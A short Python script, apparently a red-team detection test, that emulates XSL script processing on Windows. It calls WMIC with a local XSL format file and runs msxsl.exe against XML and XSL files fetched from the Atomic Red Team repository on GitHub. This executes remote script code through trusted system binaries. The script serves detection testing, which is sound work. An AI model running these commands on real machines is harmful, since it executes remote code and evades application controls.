import os
import common


msxsl = common.get_path("bin", "msxsl.exe")

def main():
    wmic = "C:\\Windows\\System32\\wbem\\WMIC.exe"

    # Must be executed from the RTA folder, or adjust the path below
    common.execute([wmic, "os", "get", "/FORMAT:bin\\a.xsl"], timeout=5, kill=True)

    
    common.execute([wmic, "os", "get", "/FORMAT:bin\\a"], timeout=5, kill=True)

    common.execute([msxsl, "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml", "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"], timeout=5, kill=True)

if __name__ == "__main__":
    exit(main())
